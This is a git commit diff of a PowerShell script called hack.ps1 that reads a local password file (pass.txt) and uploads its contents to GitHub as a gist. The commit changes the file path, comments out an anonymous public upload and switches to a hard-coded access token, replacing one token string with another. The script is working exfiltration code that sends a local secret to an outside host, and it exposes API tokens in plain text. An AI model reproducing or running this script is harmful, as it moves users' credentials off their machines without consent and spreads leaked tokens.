0fc9a867b831bb49c925e2f88654ee894ba9dd4b
2arcz6 <2arcz6@gmail.com>
2019-12-20 02:29:14 +0800

    updated code and token

--- hack.ps1
+++ hack.ps1
@@ -1,28 +1,22 @@
 $URL = "https://api.github.com"
 $Endpoint = "/gists"
+$password = Get-Content C:\Users\ASUS\Desktop\pass.txt
 
-$URLAnon = "$URL$Endpoint"
+# $URLAnon = "$URL$Endpoint"
+# $JSON = ConvertTo-Json @{
+#           description = "test fetch";
+#           public =  $true;
+#           files = @{
+#             "file1.txt" = @{
+#               content = $password
+#             }
+#           }
+#         }
+# $gist = Invoke-RestMethod -Method Post -Uri $URLAnon -Body $JSON
 
-$password = Get-Content C:\Users\ASUS\pass.txt
-
-$JSON = ConvertTo-Json @{
-          description = "test fetch";
-          public =  $true;
-          files = @{
-            "file1.txt" = @{
-              content = $password
-            }
-          }
-        }
-
-
-$gist = Invoke-RestMethod -Method Post -Uri $URLAnon -Body $JSON
-
-$Token = "?access_token=219878b8de9d3911dc27e93109547956f2acc253"
+$Token = "?access_token=2b3aef14ba9be99c3688f204a40d4d75ee3a3bf2"
 $URLSecure = "$URL$Endpoint$Token"
-
 $gist = Invoke-RestMethod -Method Post -Uri $URLSecure -Body $JSON
-
 $URLEdit = "$URL$Endpoint/$($gist.id)$Token"
 
 $JSON2 = ConvertTo-Json @{
